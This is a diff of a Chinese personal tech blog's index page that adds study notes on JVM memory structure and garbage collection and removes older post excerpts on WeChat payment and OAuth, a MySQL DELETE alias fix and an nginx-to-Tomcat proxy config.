+<h2 id="1-2-认识java-虚拟机的基本结构"><a href="#1-2-认识java-虚拟机的基本结构" class="headerlink" title="1.2 认识java 虚拟机的基本结构"></a>1.2 认识java 虚拟机的基本结构</h2><p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fp5o9yvclcj30ok0doq3v.jpg" alt=""></p>
+<p>九大部分：</p>
+<p>1.类加载子系统<br>    负责从文件系统或网络中加载Class信息，加载的信息放在方法区里。</p>
+<p>2.方法区<br>    存放类信息，常量信息，常量池信息，包括字符串字面量和数字常量等。</p>
+<p>3.java堆<br>    在java虚拟机启动的时候建立java堆，它是java程序最主要的内存工作区域，几乎所有的对象实例都放在java堆中，堆空间是所有线程共享的。</p>
+<p>4.直接内存<br>    java的NIO库允许java程序使用直接内存，从而提高性能，通常直接内存速度会优于java堆，读写频繁的场合可能会考虑使用</p>
+<p>5.java栈<br>    每个虚拟机线程都有一个私有的栈，一个线程的java栈在线程创建的时候被创建，java栈中保存局部变量，方法参数，同时java的方法调用，返回值等。</p>
+<p>6.本地方法栈<br>    本地方法栈和java栈非常累屎，最大不同为本地方法栈用于本地方法调用。java虚拟机允许java直接调用本地方法（通常使用c编写）</p>
+<p>7.垃圾回收系统<br>    垃圾回收系统是java的核心，也是必不可少的，java有一套自己进行垃圾清理的机制，开发人员无需手工清理。</p>
+<p>8.PC寄存器<br>    Program Counter 寄存器也是每个线程私有的空间，java虚拟机会为每个线程创建pc寄存器，在任意时刻，一个java线程总是执行一个方法，这个方法被称为当前方法，如果当前方法不是本地方法，pc寄存器就会执行当前正在被执行的指令；如果是本地方法，则pc寄存器值为undefined，寄存器存放如当前执行环境指针，程序计数器，操作栈指针，计算的变量等信息。</p>
+<p>9.执行引擎<br>    虚拟机最核心的组件就是执行引擎了，它负责执行虚拟机的字节码，一般先进行编译成机器码后执行</p>
+<h2 id="2-2-java-堆"><a href="#2-2-java-堆" class="headerlink" title="2.2 java 堆"></a>2.2 java 堆</h2><p>java 堆分代：年轻代与年老代，年轻代有3个区，eden,from,to 年老代只有一个区tenured</p>
+<p>在GC开始的时候，对象只会存在于Eden区和名为“From”的Survivor区，Survivor区“To”是空的。紧接着进行GC，Eden区中所有存活的对象都会被复制到“To”，而在“From”区中，仍存活的对象会根据他们的年龄值来决定去向。年龄达到一定值(年龄阈值，可以通过-XX:MaxTenuringThreshold来设置)的对象会被移动到年老代中，没有达到阈值的对象会被复制到“To”区域。经过这次GC后，Eden区和From区已经被清空。这个时候，“From”和“To”会交换他们的角色，也就是新的“To”就是上次GC前的“From”，新的“From”就是上次GC前的“To”。不管怎样，都会保证名为To的Survivor区域是空的。Minor GC会一直重复这样的过程，直到“To”区被填满，“To”区被填满之后，会将所有对象移动到年老代中。</p>
+<h2 id="2-3-java-栈"><a href="#2-3-java-栈" class="headerlink" title="2.3 java 栈"></a>2.3 java 栈</h2><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fpdudp8mbjj30qo0fwdku.jpg" alt=""></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fpdupm8xk0j31580vuta7.jpg" alt=""></p>
+<h2 id="2-4-java-方法区"><a href="#2-4-java-方法区" class="headerlink" title="2.4 java 方法区"></a>2.4 java 方法区</h2><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fpduec3s08j30q604emzm.jpg" alt=""></p>
+<h2 id="3-2-jvm参数配置"><a href="#3-2-jvm参数配置" class="headerlink" title="3.2 jvm参数配置"></a>3.2 jvm参数配置</h2><h3 id="堆配置"><a href="#堆配置" class="headerlink" title="堆配置"></a>堆配置</h3><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fpdw08xybzj30qk0bu78k.jpg" alt=""></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fpdw145w8gj30qs0es0y8.jpg" alt=""></p>
+<h3 id="栈配置"><a href="#栈配置" class="headerlink" title="栈配置"></a>栈配置</h3><p><a href="https://asciinema.org/a/7P4ZGP8eC1RsgzCqiqHDTEIPz" target="_blank" rel="noopener"><img src="https://asciinema.org/a/7P4ZGP8eC1RsgzCqiqHDTEIPz.png" alt="asciicast"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/02/26/java-concurrent-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1250,806 +2068,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/01/20/weixin-subapp-pay/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Dravin">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dravin's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/01/20/weixin-subapp-pay/" itemprop="url">微信支付-服务商下的公众号支付</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-20T11:08:58+08:00">
-                2018-01-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/微信支付/" itemprop="url" rel="index">
-                    <span itemprop="name">微信支付</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/微信支付/服务商下/" itemprop="url" rel="index">
-                    <span itemprop="name">服务商下</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/微信支付/服务商下/公众号支付/" itemprop="url" rel="index">
-                    <span itemprop="name">公众号支付</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="服务商下的公众号支付"><a href="#服务商下的公众号支付" class="headerlink" title="服务商下的公众号支付"></a>服务商下的公众号支付</h1><p>在服务商模式下，必须传本公众号和用户的openid 给服务商来生成jsapi支付参数。<br>最近有个坑，前端怎么调都是没法支付，只是转一下就没了。<br>最后发现是服务商那里没有配置该子商户的公众号支付的域名：<br>登陆服务商的微信商户后台，找到该子商户，点击配置，添加一个域名。</p>
-<h2 id="单例页面的微信支付"><a href="#单例页面的微信支付" class="headerlink" title="单例页面的微信支付"></a>单例页面的微信支付</h2><p>之前一直都是 <a href="http://xxxx/#/paypage" target="_blank" rel="noopener">http://xxxx/#/paypage</a><br>改为<a href="http://xxxx/#/pay/paypage" target="_blank" rel="noopener">http://xxxx/#/pay/paypage</a> 就可以</p>
-<p>也就是说<br>如果是单例页面如vue ,就微信后台后台配置http://xxxx/#/pay/<br>这里就是要求支付必须在2级目录里，paypage.vue得放在pay目录里。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/01/18/weixin-auth/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Dravin">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dravin's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/01/18/weixin-auth/" itemprop="url">微信网页授权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-18T11:15:34+08:00">
-                2018-01-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/微信公众号/" itemprop="url" rel="index">
-                    <span itemprop="name">微信公众号</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/微信公众号/网页授权/" itemprop="url" rel="index">
-                    <span itemprop="name">网页授权</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="微信网页授权"><a href="#微信网页授权" class="headerlink" title="微信网页授权"></a>微信网页授权</h1><p>最近做前后台分离，发现微信授权登陆做的很烦。域名跳来跳去的，跳晕了。<br>微信的网页授权文档<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421140842" target="_blank" rel="noopener">传送门</a></p>
-<p>微信官方给出的步骤:<br>1 第一步：用户同意授权，获取code</p>
-<p>2 第二步：通过code换取网页授权access_token</p>
-<p>3 第三步：刷新access_token（如果需要）</p>
-<p>4 第四步：拉取用户信息(需scope为 snsapi_userinfo)</p>
-<p>5 附：检验授权凭证（access_token）是否有效</p>
-<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>前端判断用户的cookie为空，并且是微信浏览器，就跳转到长链接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://open.weixin.qq.com/connect/oauth2/authorize?appid=公众号APPID&amp;redirect_uri=后台地址&amp;response_type=code&amp;scope=SCOPE&amp;state=前端拼接的随机字符串#wechat_redirect</span><br></pre></td></tr></table></figure>
-<p>用户的体验是：他打开了前端的一个网页，然后跳转到open.weixin.qq.com的网页，然后又杯重定向到后台的一个地址。最后，后台获取用户信息后，又重定向到前端的某一个页面。</p>
-<p>我门可以思考一个这样的场景，你的朋友分享了一个商城的商品详情页面给你。你打开之后，有了以上的跳转体验，是不是很晕，但是用户用微信浏览器打开的时候是看不到地址的变化，只看到上面有一个绿色的进度条，加载了又加载了…。我们要的效果就是，用户打开这个商品详情页面就静默授权，然后回跳到该页面。</p>
-<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>前端的实现：</p>
-<p>前端在跳转前，使用cookie保存当前的请求的地址ori_path，还要保存一个md5(时间+随机数) 的值md5_str，拼到长链接里。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://open.weixin.qq.com/connect/oauth2/authorize?appid=公众号APPID&amp;redirect_uri=后台地址&amp;response_type=code&amp;scope=SCOPE&amp;state=md5_str#wechat_redirect</span><br></pre></td></tr></table></figure>
-<p>拼好后，跳转！ -》微信官方-》后台-》前端某一个具体的地址/auth</p>
-<p>这时候，前端在/auth的页面里，cookie拿出md5_str,去异步请求后台获取用户数据，再拿出之前存的地址ori_path去跳转。</p>
-<p>后台的实现：</p>
-<p>做一个controller,接受微信官方的请求，微信会带来code 和state (md5_str)<br>拿到code就可以拿到用户信息，具体查看微信公众号文档<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421140842" target="_blank" rel="noopener">传送门</a>,然后，用户数据和state(md5_str)保存起来</p>
-<p>再做一个controller，接受前端发来的md5_str,去拿用户数据</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/01/18/weixin-mppay/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Dravin">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dravin's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/01/18/weixin-mppay/" itemprop="url">微信公众号支付</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-18T11:00:04+08:00">
-                2018-01-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/微信支付/" itemprop="url" rel="index">
-                    <span itemprop="name">微信支付</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/微信支付/公众号支付/" itemprop="url" rel="index">
-                    <span itemprop="name">公众号支付</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="微信公众号支付"><a href="#微信公众号支付" class="headerlink" title="微信公众号支付"></a>微信公众号支付</h1><p>如果是服务商下的公众号发起公众号支付，必须有以下参数<br>用户在子公众号下的openid</p>
-<h2 id="开发者调试的时候找不到子公众号的openid"><a href="#开发者调试的时候找不到子公众号的openid" class="headerlink" title="开发者调试的时候找不到子公众号的openid"></a>开发者调试的时候找不到子公众号的openid</h2><p>1.开发者先关注该服务商下的被服务的公众号（这里叫子公众号）<br>2.在子公众号里的用户管理下，新建一个标签“开发”,把开发人员拉进去<br>3.在<a href="https://mp.weixin.qq.com/debug/" target="_blank" rel="noopener">线上调试工具</a>先获取access_token,<br>4.在<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421140837" target="_blank" rel="noopener">微信文档-标签</a>,先调用获取公众号已创建的标签，再调用获取标签下粉丝列表<br>5.如果你想查询一下该openid的具体用户信息，请调用<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421140839" target="_blank" rel="noopener">微信文档-用户信息</a>里的获取用户基本信息</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/01/17/mysql-delete/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Dravin">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dravin's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/01/17/mysql-delete/" itemprop="url">mysql中delete语句使用别名</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-17T17:34:49+08:00">
-                2018-01-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/mysql/" itemprop="url" rel="index">
-                    <span itemprop="name">mysql</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/mysql/delete/" itemprop="url" rel="index">
-                    <span itemprop="name">delete</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="delete语法中使用别名"><a href="#delete语法中使用别名" class="headerlink" title="delete语法中使用别名"></a>delete语法中使用别名</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> a_table A <span class="keyword">where</span> A.name = <span class="string">'123'</span>;</span><br></pre></td></tr></table></figure>
-<p>但是有一个错误</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near</span><br></pre></td></tr></table></figure>
-<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在delete 与from之间加上一个别名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> A <span class="keyword">from</span> a_table A <span class="keyword">where</span> A.name = <span class="string">'123'</span>;</span><br></pre></td></tr></table></figure>
-<p>删除成功!</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/01/16/nginx-proxy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Dravin">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dravin's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/01/16/nginx-proxy/" itemprop="url">nginx反向代理tomcat</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-16T17:18:32+08:00">
-                2018-01-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/nginx/" itemprop="url" rel="index">
-                    <span itemprop="name">nginx</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="反向代理tomcat并提供web服务"><a href="#反向代理tomcat并提供web服务" class="headerlink" title="反向代理tomcat并提供web服务"></a>反向代理tomcat并提供web服务</h1><h2 id="定义了两个server"><a href="#定义了两个server" class="headerlink" title="定义了两个server"></a>定义了两个server</h2><p>每个server指定一个域名<br>dev.mall.com指向一个web应用<br>api.mall.com反向代理到8080端口tomcat上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name dev.mall.com;</span><br><span class="line">    access_log  /www/wwwlogs/mall-acess_log;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /www/wwwroot/mall;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name api.mall.com;</span><br><span class="line">    access_log  /www/wwwlogs/mall-api-acess_log;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8080; </span><br><span class="line">        proxy_read_timeout 300;</span><br><span class="line">        proxy_connect_timeout 300;</span><br><span class="line">        proxy_redirect     off;</span><br><span class="line"></span><br><span class="line">        proxy_set_header   Host    $host; </span><br><span class="line">        proxy_set_header   X-Real-IP   $remote_addr; </span><br><span class="line">        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2099,7 +2122,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2110,7 +2133,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2121,7 +2144,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
